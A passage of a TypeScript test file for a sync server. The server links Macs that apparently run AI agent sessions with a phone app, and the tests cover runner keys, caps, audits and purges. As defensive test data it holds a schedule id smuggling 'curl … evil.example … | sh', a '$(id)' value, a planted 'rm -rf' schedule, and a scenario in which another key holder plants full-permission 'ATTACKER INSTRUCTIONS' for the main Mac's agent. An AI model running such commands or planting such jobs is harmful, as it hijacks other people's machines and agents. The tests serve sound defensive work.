  assert.equal(tokens[0].name, "Mike's iPhone");
  assert.equal((await a('runnerKeys'))[0].runnerId, BRUCE);
  const schedules = await a('schedules');
  assert.equal(schedules[0].permissionMode, 'full');
  assert.match(schedules[0].text, /^rm -rf/);
  const cards = await a('cards');
  assert.equal(cards[0].title, 'Deploy');
  const messages = await a('messages');
  assert.equal(messages.length, 1);
  assert.equal(messages[0].seq, 50);
  const pictures = await a('replyImages');
  assert.equal(pictures.length, 1);
  assert.equal(await outcome(call(s.ctx, sync.audit, { key: BRUCE_KEY, section: 'tokens' })), 'forbidden');
  // A legit message written after the audit isn't taken with the planted one: only the exact rows go.
  await s.owner.append('T', 'legit, after the audit', 51);
  const keys = await a('runnerKeys');
  const pick = [tokens[0], keys[0], schedules[0], cards[0], messages[0], pictures[0]].map((r: { kind: string; id: string; version: string }) => ({ kind: r.kind, id: r.id, version: r.version }));
  assert.equal(await call(s.ctx, sync.auditRemove, { key: OWNER, rows: pick }), 6);
  assert.ok(s.rows('tokens')[0]!.revokedAt);
  assert.equal(await outcome(s.bruce.upsert(thread('X', BRUCE))), 'auth');
  assert.equal(s.rows('schedules').length, 0);
  assert.equal(s.rows('pocketCards').length, 0);
  assert.equal(s.rows('replyImages').length, 0);
  assert.deepEqual(textsOf(s.rows('messages'), 'T'), ['real', 'legit, after the audit']);
});

// ------------------------------------------------------------ fourth review (85058d01)

test("a runner key's schedule ids are UUIDs, so none can carry anything a terminal would run", async () => {
  const s = await setup();
  assert.equal(await outcome(call(s.ctx, sync.saveSchedule, { key: BRUCE_KEY, schedule: sched('x;curl -s https://evil.example/s|sh;#', BRUCE) })), 'badArgs');
  assert.equal(await outcome(call(s.ctx, sync.adoptSchedules, { key: BRUCE_KEY, runnerId: BRUCE, schedules: [sched('$(id)', BRUCE)] })), 'ok');
  assert.equal(s.rows('schedules').length, 0, 'adoption skips a bad id');
  await call(s.ctx, sync.saveSchedule, { key: BRUCE_KEY, schedule: sched(UUID(1), BRUCE) });
});

test('caps are bytes, and hold on every path that changes a row', async () => {
  const s = await setup();
  const cjk = '\u6f22'.repeat(15_000); // 45 KB in UTF-8, 15,000 characters
  await s.bruce.upsert(thread('B', BRUCE, { cwd: cjk }));
  const t = s.rows('threads').find((r) => r.threadId === 'B');
  assert.ok(!t || bytes(t) <= 8_192, `thread row ${t && bytes(t)} bytes`);
  await call(s.ctx, sync.upsertProjects, { key: BRUCE_KEY, runnerId: BRUCE, projects: [{ id: 'p', title: 't', folders: [], goals: '', state: '', notes: cjk, createdBy: 'mike', archived: false, createdAt: 'c', updatedAt: 'u', threadCount: 0 }], removed: [] });
  for (const p of s.rows('projects')) assert.ok(bytes(p) <= 32_768, `project ${bytes(p)} bytes`);
  // A schedule that's small when saved stays small when a run is recorded on it.
  await call(s.ctx, sync.saveSchedule, { key: BRUCE_KEY, schedule: sched(UUID(2), BRUCE, { nextRunAt: 'n' }) });
  await call(s.ctx, sync.scheduleRan, { key: BRUCE_KEY, scheduleId: UUID(2), holder: 'h', lastRun: { at: 'a', outcome: 'sent', note: 'x'.repeat(900_000) }, sent: true, expectUpdatedAt: 'u' });
  const row = s.rows('schedules').find((r) => r.id === UUID(2))!;
  assert.ok(bytes(row) <= 8_192, `schedule ${bytes(row)} bytes`);
});

test("a runner key's sidebar rows are capped in number, and a long why is trimmed, not refused", async () => {
  const s = await setup();
  const rows = Array.from({ length: 1_100 }, (_, i) => ({ ...indexRow(`T${i}`), startedBy: { kind: 'agent', label: 'x', why: 'w'.repeat(10_000) } }));
  await call(s.ctx, sync.setThreadIndex, { key: BRUCE_KEY, runnerId: BRUCE, rows, removed: [] });
  const mine = s.rows('threadIndex').filter((r) => r.runnerId === BRUCE && !r.deleted);
  assert.ok(mine.length > 0 && mine.length <= 1_000, String(mine.length));
  for (const r of mine) assert.ok(bytes(r) <= 2_048);
});

test("one row over a cap never stalls a runner key's whole write: it's skipped and said, the rest go", async () => {
  const s = await setup();
  const threads = Array.from({ length: 305 }, (_, i) => thread(`I${i}`, BRUCE, { lastActivityMs: i + 1 }));
  const r = await s.bruce.upsert(...threads);
  assert.equal(s.rows('threads').length, 305, 'every row written');
  assert.equal(s.rows('threads').filter((t) => t.view === 'inbox').length, 300);
  assert.deepEqual(r.skipped, []);
  // The heartbeat of a Mac with a long or non-ASCII name still goes.
  await hb(s, BRUCE_KEY, BRUCE, 'Bruce’s Mac mini in the back room by the printer');
  assert.match(s.rows('runners').find((x) => x.runnerId === BRUCE)!.name, /^Bruce's Mac mini/);
});

test('names are folded, not stripped, and look-alikes are told apart', async () => {
  const s = await setup();
  await hb(s, OWNER, M5, 'Mike’s MacBook Pro');
  await hb(s, OWNER, 'tinker000001', 'm5');
  for (const [name, near] of [["Mike's MacBook Pro", /Mike's MacBook Pro \(/], ['rn5', /\(/], ['M5', /\(/]] as const) {
    await hb(s, BRUCE_KEY, BRUCE, name);
    assert.match(s.rows('runners').find((r) => r.runnerId === BRUCE)!.name, near, name);
  }
});

test("a runner's own legacy mirrored schedules move up under its own key, replacing its old rows", async () => {
  const s = await setup();
  for (let i = 0; i < 60; i++) await s.ctx.db.insert('schedules', sched(UUID(100 + i), BRUCE));
  await s.ctx.db.insert('schedules', sched(UUID(500), M5));
  const docs = Array.from({ length: 60 }, (_, i) => sched(UUID(100 + i), BRUCE));
  // One the M5 has holds the whole move back (nothing lost), and says so.
  const held = await call(s.ctx, sync.adoptSchedules, { key: BRUCE_KEY, runnerId: BRUCE, schedules: [...docs, sched(UUID(500), BRUCE)] });
  assert.deepEqual(held.held.map((h: { id: string }) => h.id), [UUID(500)]);
  assert.equal(s.rows('schedules').filter((r) => r.runnerId === BRUCE && r.owned).length, 0);
  await call(s.ctx, sync.adoptSchedules, { key: BRUCE_KEY, runnerId: BRUCE, schedules: docs });
  const bruce = s.rows('schedules').filter((r) => r.runnerId === BRUCE);
  assert.equal(bruce.length, 60);
  assert.ok(bruce.every((r) => r.owned));
  assert.equal(s.rows('schedules').filter((r) => r.runnerId === M5).length, 1, "the M5's id isn't taken");
});

test("a runner with its own key is never the phone's main Mac, and its pushes say which Mac", async () => {
  const s = await setup();
  const now = Date.now();
  await s.ctx.db.insert('runners', { runnerId: M5, name: 'm5', version: 'v', startedAt: 'x', draining: false, threadCount: 99_999, lastSeenAt: now - 10 * 60_000, byOwner: true });
  await s.ctx.db.insert('runners', { runnerId: 'tinker000001', name: 'tinker', version: 'v', startedAt: 'x', draining: false, threadCount: 9_999, lastSeenAt: now, byOwner: true });
  await call(s.ctx, sync.addRunnerKey, { key: OWNER, runnerId: 'tinker000001', name: 'tinker', ownerRunnerId: M5 });
  assert.equal(s.rows('runners').find((r) => r.runnerId === 'tinker000001')!.byOwner, undefined, 'cleared');
  // Even with byOwner still set (a heartbeat raced the key), a live key keeps it off the phone's default.
  await s.ctx.db.patch(s.rows('runners').find((r) => r.runnerId === 'tinker000001')!._id, { byOwner: true });
  const token = 'phone-token';
  await s.ctx.db.insert('tokens', { hash: await sha256(token), name: 'phone', expiresAt: now + 100_000, createdAt: now });
  await call(s.ctx, phone.create, { token, text: 'new' });
  assert.notEqual(s.rows('commands').at(-1)!.runnerId, 'tinker000001');
  const devices = load('devices');
  const { pushText } = await import('../../../convex/pushText.ts');
  await s.ctx.db.insert('threads', { ...thread('TT', 'tinker000001'), status: 'idle', preview: 'p' });
  assert.match(pushText(await call(s.ctx, devices.threadForPush, { threadId: 'TT' })).title, /^tinker · /);
  // A runner key that never heartbeats: no row, named by its id.
  await s.bruce.upsert({ ...thread('BB', BRUCE), status: 'idle', preview: 'p' });
  assert.match(pushText(await call(s.ctx, devices.threadForPush, { threadId: 'BB' })).title, new RegExp(`^${BRUCE} · `));
});


test('upload bytes count from used tickets for the whole hour, refused tickets are spent, and a runner has a total', async () => {
  const s = await setup();
  await s.bruce.upsert(thread('B', BRUCE));
  const ticket = async () => new URL(await call(s.ctx, sync.iconUploadUrl, { key: BRUCE_KEY })).searchParams.get('ticket')!;
  // Upload, then have the file deleted (an image for no row): the bytes still count.
  let ok = 0;
  for (let i = 0; i < 30; i++) {
    const t = await ticket();
    const id = s.file(`f${i}`);
    if ((await call(s.ctx, sync.redeemUpload, { ticket: t, storageId: id, bytes: 9 * 1024 * 1024 })) === true) {
      ok++;
      await s.bruce.replyImage('NOROW', id);
      assert.equal(s.hasFile(id), false);
    }
  }
  assert.ok(ok <= 22, `${ok} x 9 MB in an hour`);
  // Over the hour's allowance is "later", not a refusal for good; the ticket's spent either way.
  const t = await ticket();
  assert.equal(await call(s.ctx, sync.redeemUpload, { ticket: t, storageId: s.file('over'), bytes: 9 * 1024 * 1024 }), 'later');
  assert.equal(await call(s.ctx, sync.uploadTicketOk, { ticket: t }), false);
});

test('pruneOld works in batches, so a flood of old rows never makes it fail for good', async () => {
  const s = await setup();
  const old = Date.now() - 3 * 24 * 60 * 60_000;
  for (let i = 0; i < 1_500; i++) await s.ctx.db.insert('commands', { runnerId: M5, kind: 'send', args: {}, state: 'done', createdAt: old, doneAt: old });
  await call(s.ctx, sync.pruneOld, {});
  const left = s.rows('commands').length;
  assert.ok(left > 0 && left < 1_500, String(left));
  assert.ok(s.scheduled.some((x: any) => /pruneOld/.test(x.fn)), 'carries on in another run');
});

// ------------------------------------------------------------ fifth review (af8378f8)

test('adoption is all or nothing for a runner key: any schedule it would leave out means nothing changes, and it says which', async () => {
  const s = await setup();
  await s.ctx.db.insert('schedules', sched(UUID(1), BRUCE));
  const ok = sched(UUID(1), BRUCE, { text: 'x'.repeat(9_000) }); // a long but real prompt fits
  const big = sched(UUID(2), BRUCE, { text: 'y'.repeat(20_000) });
  const r = await call(s.ctx, sync.adoptSchedules, { key: BRUCE_KEY, runnerId: BRUCE, schedules: [ok, big] });
  assert.deepEqual(r.held.map((h: { id: string }) => h.id), [UUID(2)]);
  assert.deepEqual(s.rows('schedules').map((x) => `${x.id}:${x.owned ? 'owned' : 'mirrored'}`), [`${UUID(1)}:mirrored`], 'nothing changed');
  const r2 = await call(s.ctx, sync.adoptSchedules, { key: BRUCE_KEY, runnerId: BRUCE, schedules: [ok] });
  assert.deepEqual(r2.held, []);
  assert.deepEqual(s.rows('schedules').map((x) => `${x.id}:${x.owned ? 'owned' : 'mirrored'}`), [`${UUID(1)}:owned`]);
});

test("a heartbeat whose name collides at full length still ends, with a distinct name", async () => {
  const s = await setup();
  const long = 'a'.repeat(40);
  await hb(s, OWNER, M5, long);
  await hb(s, OWNER, 'other0000001', `${'a'.repeat(33)} (cb921b)`);
  await hb(s, BRUCE_KEY, BRUCE, long);
  const mine = s.rows('runners').find((r) => r.runnerId === BRUCE)!.name;
  assert.ok(mine.length <= 64);
  assert.notEqual(mine, long);
});

test("a busy runner key's newest threads and sidebar rows show, and nothing of the older ones is deleted", async () => {
  const s = await setup();
  const { RUNNER_KEY_CAPS: CAP } = sync as { RUNNER_KEY_CAPS: { threadsInView: number; indexRows: number } };
  const n = CAP.threadsInView + 5;
  for (let i = 0; i < n; i++) await s.bruce.upsert(thread(`I${i}`, BRUCE, { lastActivityMs: i + 1 }));
  await s.bruce.append('I0', 'the oldest thread keeps its messages');
  const inbox = s.rows('threads').filter((t) => t.runnerId === BRUCE && t.view === 'inbox').map((t) => t.threadId);
  assert.equal(inbox.length, CAP.threadsInView);
  assert.ok(inbox.includes(`I${n - 1}`) && !inbox.includes('I0'), 'newest in the list, oldest out of it');
  // Out of the list, not gone: its row, messages and all stay, and by id it's still an inbox thread.
  assert.equal(s.rows('threads').filter((t) => t.runnerId === BRUCE).length, n);
  assert.deepEqual(textsOf(s.rows('messages'), 'I0'), ['the oldest thread keeps its messages']);
  const token = 'phone-token';
  await s.ctx.db.insert('tokens', { hash: await sha256(token), name: 'phone', expiresAt: Date.now() + 100_000, createdAt: 1 });
  assert.equal((await call(s.ctx, phone.threadRow, { token, threadId: 'I0' })).view, 'inbox');
  // Sidebar: tombstones give way first, then an old archived row, before
  // any live one; archived threads are listed (API 54).
  const rows = Array.from({ length: CAP.indexRows }, (_, i) => (i === 5 ? { ...indexRow(`S${i}`), archivedAt: 'x' } : indexRow(`S${i}`)));
  for (let i = 0; i < rows.length; i += 100) await call(s.ctx, sync.setThreadIndex, { key: BRUCE_KEY, runnerId: BRUCE, rows: rows.slice(i, i + 100), removed: [] });
  await call(s.ctx, sync.setThreadIndex, { key: BRUCE_KEY, runnerId: BRUCE, rows: [], removed: ['S0', 'S1'] });
  await call(s.ctx, sync.setThreadIndex, { key: BRUCE_KEY, runnerId: BRUCE, rows: [indexRow('NEW1'), indexRow('NEW2'), { ...indexRow('A1'), archivedAt: 'x' }], removed: [] });
  const all = s.rows('threadIndex').filter((r) => r.runnerId === BRUCE);
  assert.ok(all.length <= CAP.indexRows, String(all.length));
  const listed = new Set(all.filter((r) => !r.deleted).map((r) => r.threadId));
  assert.equal(listed.size, CAP.indexRows);
  for (const id of ['NEW1', 'NEW2', 'A1']) assert.ok(listed.has(id), `${id} listed`);
  assert.ok(!listed.has('S5'), 'the old archived row gave way');
  assert.ok(listed.has('S2'), 'not a live one');
});

test("a waiting question keeps exactly what its answer is matched on; one too big to fit says to answer on the Mac", async () => {
  const s = await setup();
  const question = 'Which of these should I deploy first? '.repeat(20); // ~760 bytes
  const q = (n: number, desc: number) => ({ approvalId: 'a', kind: 'question', questions: Array.from({ length: n }, (_, i) => ({ question: `${i} ${question}`, header: `H${i}`, multiSelect: false, options: Array.from({ length: 8 }, (_, j) => ({ label: `option ${j}`, description: 'd'.repeat(desc) })) })) });
  await s.bruce.upsert(thread('Q1', BRUCE, { pendingApproval: q(1, 2_000) }));
  const t1 = s.rows('threads').find((r) => r.threadId === 'Q1')!;
  assert.equal(t1.pendingApproval.questions[0].question, `0 ${question}`, 'question text untouched');
  assert.deepEqual(t1.pendingApproval.questions[0].options.map((o: { label: string }) => o.label), Array.from({ length: 8 }, (_, j) => `option ${j}`));
  assert.ok(bytes(t1) <= 8_192);
  // Four questions of eight options that can't fit even without descriptions: a card that says so.
  await s.bruce.upsert(thread('Q4', BRUCE, { pendingApproval: q(4, 2_000), title: 'x'.repeat(250) }));
  await s.bruce.upsert(thread('Q9', BRUCE, { pendingApproval: { ...q(1, 0), questions: [{ question: 'q'.repeat(9_000), multiSelect: false, options: [] }] } }));
  for (const id of ['Q4', 'Q9']) {
    const t = s.rows('threads').find((r) => r.threadId === id)!;
    assert.ok(t && bytes(t) <= 8_192, id);
    if (t.pendingApproval.kind === 'question') for (const qq of t.pendingApproval.questions) assert.ok(qq.question.startsWith('0 ') || qq.question.startsWith('1 ') || qq.question.startsWith('2 ') || qq.question.startsWith('3 '));
    else assert.match(t.pendingApproval.title, /Answer it on the Mac/);
  }
});

test('pruneOld finds old finished commands by when they finished, not when they were made', async () => {
  const s = await setup();
  const now = Date.now();
  await s.ctx.db.insert('commands', { runnerId: M5, kind: 'send', args: {}, state: 'done', createdAt: now - 9e9, doneAt: now });
  for (let i = 0; i < 5; i++) await s.ctx.db.insert('commands', { runnerId: M5, kind: 'send', args: {}, state: 'done', createdAt: now - 1e9, doneAt: now - 3 * 86_400_000 });
  await call(s.ctx, sync.pruneOld, {});
  assert.equal(s.rows('commands').length, 1);
});

test('a key for a busy second Mac is fine; the asking Mac\'s own id never is, and the audit flags one made for it', async () => {
  const s = await setup();
  const now = Date.now();
  await s.ctx.db.insert('runners', { runnerId: 'busy00000001', name: 'busy', version: 'v', startedAt: 'x', draining: false, threadCount: 99_999, lastSeenAt: now, byOwner: true });
  await call(s.ctx, sync.addRunnerKey, { key: OWNER, runnerId: 'busy00000001', name: 'busy', ownerRunnerId: M5 });
  // One made for the M5 by an earlier shared-key holder.
  await s.ctx.db.insert('runnerKeys', { runnerId: M5, keyHash: 'x', name: 'planted', createdAt: 1 });
  const keys = await call(s.ctx, sync.audit, { key: OWNER, section: 'runnerKeys', ownRunnerId: M5 });
  assert.equal(keys.rows.find((k: { runnerId: string }) => k.runnerId === M5).mainMac, true);
});

test('sidebar rows: revival counts, and the owner reads each runner\'s rows within a bound', async () => {
  const s = await setup();
  for (let round = 0; round < 3; round++) {
    const rows = Array.from({ length: 400 }, (_, i) => indexRow(`R${round}-${i}`));
    await call(s.ctx, sync.setThreadIndex, { key: BRUCE_KEY, runnerId: BRUCE, rows, removed: rows.map((r) => r.threadId) });
  }
  assert.ok(s.rows('threadIndex').filter((r) => r.runnerId === BRUCE).length <= 800);
  const got = await call(s.ctx, sync.threadIndexSince, { key: OWNER, runners: [{ runnerId: BRUCE }] });
  assert.ok(got.length <= 1_000);
});

test('projects: one row per id, a real count, icons capped and only on its own projects', async () => {
  const s = await setup();
  const p = (id: string) => ({ id, title: 't', folders: [], goals: '', state: '', notes: '', createdBy: 'mike', archived: false, createdAt: 'c', updatedAt: 'u', threadCount: 0 });
  await call(s.ctx, sync.setProjects, { key: BRUCE_KEY, runnerId: BRUCE, projects: Array.from({ length: 50 }, () => p('same')) });
  assert.equal(s.rows('projects').length, 1);
  for (let i = 0; i < 3; i++) await call(s.ctx, sync.upsertProjects, { key: BRUCE_KEY, runnerId: BRUCE, projects: Array.from({ length: 48 }, (_, j) => p(`p${i}-${j}`)), removed: [] });
  assert.ok(s.rows('projects').filter((r) => r.runnerId === BRUCE).length <= 50);
  const pic = await upload(s, BRUCE_KEY, 'icon');
  assert.equal(await outcome(call(s.ctx, sync.setProjectIcon, { key: BRUCE_KEY, runnerId: BRUCE, projectId: 'nope', picture: 'x', storageId: pic, mediaType: 'image/png' })), 'forbidden');
  await call(s.ctx, sync.setProjectIcon, { key: BRUCE_KEY, runnerId: BRUCE, projectId: 'same', picture: 'x'.repeat(900_000), storageId: pic, mediaType: 'm'.repeat(900_000) });
  for (const i of s.rows('projectIcons')) assert.ok(bytes(i) <= 1_024);
});

test('a message row is capped whole, and a runner key keeps a bounded number of messages', async () => {
  const s = await setup();
  await s.bruce.upsert(thread('B', BRUCE));
  await call(s.ctx, sync.appendMessages, { key: BRUCE_KEY, messages: [{ threadId: 'B', seq: 1, role: 'user', text: 't', origin: 'o'.repeat(900_000), at: 'a'.repeat(900_000), turn: 't'.repeat(900_000), pagedAt: 1 }] });
  for (const m of s.rows('messages')) assert.ok(bytes(m) <= 12_288, String(bytes(m)));
});

test('den threads and pushes have per-key budgets, and old thread tombstones go', async () => {
  const s = await setup();
  const before = s.scheduled.length;
  for (let i = 0; i < 30; i++) {
    await s.bruce.upsert(thread(`P${i}`, BRUCE, { needsYou: false }));
    await s.bruce.upsert(thread(`P${i}`, BRUCE, { needsYou: true }));
  }
  const pushes = s.scheduled.length - before;
  assert.ok(pushes > 0 && pushes <= 10, `${pushes} pushes in a minute`);
  await s.ctx.db.insert('threadTombstones', { threadId: 'old', runnerId: M5, at: Date.now() - 60 * 86_400_000 });
  await call(s.ctx, sync.pruneOld, {});
  assert.ok(!s.rows('threadTombstones').some((t) => t.threadId === 'old'));
});

test('the audit pages through live credentials directly, section by section, with exact rows and versions', async () => {
  const s = await setup();
  for (let i = 0; i < 400; i++) await s.ctx.db.insert('tokens', { hash: `h${i}`, name: `junk${i}`, createdAt: 1, expiresAt: Date.now() + 1e9, revokedAt: 1 });
  const live = await call(s.ctx, sync.issueToken, { key: OWNER, kind: 'phone', name: 'live one' });
  const page = await call(s.ctx, sync.audit, { key: OWNER, section: 'tokens' });
  assert.deepEqual(page.rows.map((r: { id: string }) => r.id), [live.id]);
  assert.ok(typeof page.rows[0].version === 'string');
  // Planted messages are read a few at a time, so huge ones can't break it.
  await s.owner.upsert(thread('T', M5));
  for (let i = 0; i < 12; i++) await s.ctx.db.insert('messages', { threadId: 'T', seq: 10 + i, role: 'user', text: 'x'.repeat(900_000), at: 'a' });
  let cursor: string | undefined;
  let n = 0;
  for (let guard = 0; guard < 20; guard++) {
    const p = await call(s.ctx, sync.audit, { key: OWNER, section: 'messages', heads: [{ threadId: 'T', lastSeq: 1 }], ...(cursor ? { cursor } : {}) });
    assert.ok(p.rows.length <= 5);
    n += p.rows.length;
    if (!p.next) break;
    cursor = p.next;
  }
  assert.equal(n, 12);
  // A runner key's own schedules are listed apart, so their churn doesn't change the owner's list.
  await call(s.ctx, sync.saveSchedule, { key: BRUCE_KEY, schedule: sched(UUID(3), BRUCE) });
  const sc = await call(s.ctx, sync.audit, { key: OWNER, section: 'schedules' });
  assert.ok(!sc.rows.some((r: { runnerId: string }) => r.runnerId === BRUCE));
  // Removing checks the version it saw: a changed row isn't touched.
  const token = page.rows[0];
  assert.equal(await call(s.ctx, sync.auditRemove, { key: OWNER, rows: [{ kind: 'token', id: token.id, version: 'stale' }] }), 0);
  assert.equal(await call(s.ctx, sync.auditRemove, { key: OWNER, rows: [{ kind: 'token', id: token.id, version: token.version }] }), 1);
});

test("revoke --purge takes out everything a runner wrote, once its key is revoked", async () => {
  const s = await setup();
  await s.bruce.upsert(thread('B', BRUCE));
  await s.bruce.append('B', 'm');
  await call(s.ctx, sync.setThreadIndex, { key: BRUCE_KEY, runnerId: BRUCE, rows: [indexRow('B')], removed: [] });
  await call(s.ctx, sync.savePocketCard, { key: BRUCE_KEY, card: { title: 'c', text: 't' } });
  await call(s.ctx, sync.saveSchedule, { key: BRUCE_KEY, schedule: sched(UUID(4), BRUCE) });
  assert.equal(await outcome(call(s.ctx, sync.purgeRunner, { key: OWNER, runnerId: BRUCE })), 'badArgs', 'revoke first');
  await call(s.ctx, sync.revokeRunnerKey, { key: OWNER, runnerId: BRUCE });
  for (let i = 0; i < 10; i++) if ((await call(s.ctx, sync.purgeRunner, { key: OWNER, runnerId: BRUCE })).done) break;
  for (const t of ['threads', 'messages', 'threadIndex', 'pocketCards', 'schedules', 'projects']) assert.equal(s.rows(t).filter((r) => r.runnerId === BRUCE || r.threadId === 'B').length, 0, t);
});

// ------------------------------------------------------------ sixth review (a0fb3220)

test("past the message budget a runner key's oldest messages anywhere give way, and a new thread's are never dropped", async () => {
  const s = await setup();
  const { RUNNER_KEY_CAPS: CAP } = sync as { RUNNER_KEY_CAPS: { messageBytes: number } };
  assert.ok(CAP.messageBytes >= 2 * 21 * 1024 * 1024, "at least twice the M5's whole history (about 21 MB)");
  await s.bruce.upsert(thread('OLD', BRUCE));
  // Longer than the new one, so taking it out alone makes room.
  await s.bruce.append('OLD', 'oldest '.padEnd(60, '.'), 1);
  await s.bruce.append('OLD', 'next', 2);
  const usage = s.rows('runnerStorage').find((r) => r.runnerId === BRUCE)!;
  await s.ctx.db.patch(usage._id, { messageBytes: CAP.messageBytes });
  await s.bruce.upsert(thread('NEW', BRUCE));
  await s.bruce.append('NEW', 'first in a new thread', 1);
  assert.deepEqual(textsOf(s.rows('messages'), 'NEW'), ['first in a new thread']);
  assert.deepEqual(textsOf(s.rows('messages'), 'OLD'), ['next'], 'the oldest went');
});

test("a runner key's activity times are never in the future, so it can't push others off a list", async () => {
  const s = await setup();
  await s.bruce.upsert(thread('F', BRUCE, { view: 'den', lastActivityMs: Date.now() + 1e12 }));
  assert.ok(s.rows('threads').find((r) => r.threadId === 'F')!.lastActivityMs <= Date.now());
});

test("purge won't touch an id the main key named as its own", async () => {
  const s = await setup();
  await call(s.ctx, sync.addRunnerKey, { key: OWNER, runnerId: 'tinker000001', name: 't', ownerRunnerId: M5 });
  assert.equal(await outcome(call(s.ctx, sync.purgeRunner, { key: OWNER, runnerId: M5 })), 'badArgs');
});

test('audit pages of schedules, cards and pictures are small, as their rows can be big', async () => {
  const s = await setup();
  await s.owner.upsert(thread('T', M5));
  for (let i = 0; i < 30; i++) {
    await call(s.ctx, sync.saveSchedule, { key: OWNER, schedule: sched(`S${i}`, M5) });
    await s.ctx.db.insert('pocketCards', { key: `k${i}`, title: 't', text: 'x', updatedAt: 'u' });
    await s.ctx.db.insert('replyImages', { threadId: 'T', seq: 10 + i, path: 'p', storageId: 's', mediaType: 'image/png' });
  }
  const page = async (section: string) => (await call(s.ctx, sync.audit, { key: OWNER, section, heads: [{ threadId: 'T', lastSeq: 1 }] })).rows.length;
  assert.ok((await page('schedules')) <= 10);
  assert.ok((await page('cards')) <= 20);
  assert.ok((await page('replyImages')) <= 5);
});

// ------------------------------------------------------------ seventh review (3a4e8bc0)

test('a full view is counted from viewCounts and only its oldest row is read', async () => {
  const s = await setup();
  for (let i = 0; i < 2_000; i++) await s.ctx.db.insert('threads', { ...thread(`D${i}`, BRUCE, { view: 'den', lastActivityMs: i }) });
  await s.ctx.db.insert('viewCounts', { runnerId: BRUCE, hibernating: 0, den: 2_000, inbox: 0, overflow: 0, total: 2_000 });
  const before = s.reads();
  await s.bruce.upsert(thread('NEWDEN', BRUCE, { view: 'den', lastActivityMs: 5_000 }));
  assert.ok(s.reads() - before < 100, `read ${s.reads() - before} rows`);
});

test("a runner key's threads and messages are bounded in all: past the budget new ones wait, and evictions cover inserts", async () => {
  const s = await setup();
  const { RUNNER_KEY_CAPS: CAP } = sync as { RUNNER_KEY_CAPS: { threads: number; messageBytes: number; evictPerWrite: number } };
  // Threads: past the total, a new one is left out (and said), not deleting anything.
  await s.ctx.db.insert('viewCounts', { runnerId: BRUCE, hibernating: 0, den: 0, inbox: 0, overflow: 0, total: CAP.threads });
  const r = await s.bruce.upsert(thread('ONE_TOO_MANY', BRUCE));
  assert.deepEqual(r.skipped, ['ONE_TOO_MANY']);
  // Messages: over the byte budget, each new one waits for an old one to go.
  const t = await setup();
  await t.bruce.upsert(thread('OLD', BRUCE));
  await t.bruce.append('OLD', 'old one', 1);
  const usage = t.rows('runnerStorage').find((x) => x.runnerId === BRUCE)!;
  await t.ctx.db.patch(usage._id, { messageBytes: CAP.messageBytes });
  await t.bruce.upsert(thread('NEW', BRUCE));
  const res = await call(t.ctx, sync.appendMessages, { key: BRUCE_KEY, messages: [1, 2, 3].map((seq) => ({ threadId: 'NEW', seq, role: 'user', text: `m${seq}`, at: 'a' })) });
  assert.deepEqual(textsOf(t.rows('messages'), 'OLD'), [], 'the old one went');
  assert.deepEqual(textsOf(t.rows('messages'), 'NEW'), ['m1'], 'one in for the one out');
  assert.deepEqual(res.skipped, ['NEW:2', 'NEW:3'], 'the rest said, to be sent again');
});

test('an overflowed thread comes back to its list when there is room again', async () => {
  const s = await setup();
  const { RUNNER_KEY_CAPS: CAP } = sync as { RUNNER_KEY_CAPS: { threadsInView: number } };
  for (let i = 0; i < CAP.threadsInView + 1; i++) await s.bruce.upsert(thread(`I${i}`, BRUCE, { lastActivityMs: i + 1 }));
  assert.equal(s.rows('threads').find((t) => t.threadId === 'I0')!.view, 'overflow');
  // One leaves the inbox (archived): the overflowed one comes back without being written.
  await s.bruce.upsert(thread('I5', BRUCE, { view: 'den', lastActivityMs: 6 }));
  assert.equal(s.rows('threads').find((t) => t.threadId === 'I0')!.view, 'inbox');
});

test('purge pages through big threads, and refuses a runner that never had its own key', async () => {
  const s = await setup();
  await s.bruce.upsert(thread('B', BRUCE));
  for (let i = 0; i < 300; i++) await s.bruce.append('B', `m${i}`, i + 1);
  await call(s.ctx, sync.revokeRunnerKey, { key: OWNER, runnerId: BRUCE });
  let calls = 0;
  for (; calls < 50; calls++) {
    const before = s.reads();
    const r = await call(s.ctx, sync.purgeRunner, { key: OWNER, runnerId: BRUCE });
    assert.ok(s.reads() - before <= 400, `one call read ${s.reads() - before}`);
    if (r.done) break;
  }
  assert.ok(calls > 0 && s.rows('messages').length === 0);
  // A runner the main key ran as, with no runner key ever: refused.
  await s.ctx.db.insert('runners', { runnerId: 'plain0000001', name: 'p', version: 'v', startedAt: 'x', draining: false, threadCount: 0, lastSeenAt: 1, byOwner: true });
  assert.equal(await outcome(call(s.ctx, sync.purgeRunner, { key: OWNER, runnerId: 'plain0000001' })), 'badArgs');
});

test('audit cards and pruneOld read few rows at a time, for old rows that could be 1 MiB', async () => {
  const s = await setup();
  for (let i = 0; i < 30; i++) await s.ctx.db.insert('pocketCards', { key: `k${i}`, title: 't', text: 'x'.repeat(10), updatedAt: 'u' });
  const page = await call(s.ctx, sync.audit, { key: OWNER, section: 'cards' });
  assert.ok(page.rows.length <= 5, String(page.rows.length));
  for (let i = 0; i < 40; i++) await s.ctx.db.insert('messages', { threadId: 'T', seq: i, role: 'user', text: 'x', at: 'a', pagedAt: 1 });
  const before = s.reads();
  await call(s.ctx, sync.pruneOld, {});
  assert.ok(s.reads() - before <= 60, String(s.reads() - before));
});

// Daybreak, 6 Nov 2026: Mike deletes one of the M5's schedules while the M5
// has a run of it claimed, and Bruce's key saves one of its own under the
// gone id, which the M5's subscription (every runner's rows) then has under
// the id it claimed. While the id's tombstone lasts it stays the M5's.
test("a schedule id gone from the M5 lately isn't Bruce's to take, nor to adopt", async () => {
  const s = await setup();
  await call(s.ctx, sync.saveSchedule, { key: OWNER, schedule: sched(UUID(31), M5, { check: 'news-check' }) });
  assert.equal(await call(s.ctx, sync.deleteSchedule, { key: OWNER, scheduleId: UUID(31) }), true);
  const evil = sched(UUID(31), BRUCE, { title: 'ATTACKER JOB', text: 'ATTACKER INSTRUCTIONS', check: 'news-check', permissionMode: 'full' });
  assert.equal(await outcome(call(s.ctx, sync.saveSchedule, { key: BRUCE_KEY, schedule: evil })), 'forbidden');
  const adopted = (await call(s.ctx, sync.adoptSchedules, { key: BRUCE_KEY, runnerId: BRUCE, schedules: [evil] })) as { held: { why: string }[] };
  assert.equal(adopted.held.length, 1);
  assert.equal(s.rows('schedules').length, 0);
  // Bruce's own gone ids are still its own to use again, and one moved to
  // Bruce by Mike is Bruce's to change, the M5's tombstone for it or not.
  await call(s.ctx, sync.saveSchedule, { key: BRUCE_KEY, schedule: sched(UUID(32), BRUCE) });
  await call(s.ctx, sync.deleteSchedule, { key: BRUCE_KEY, scheduleId: UUID(32) });
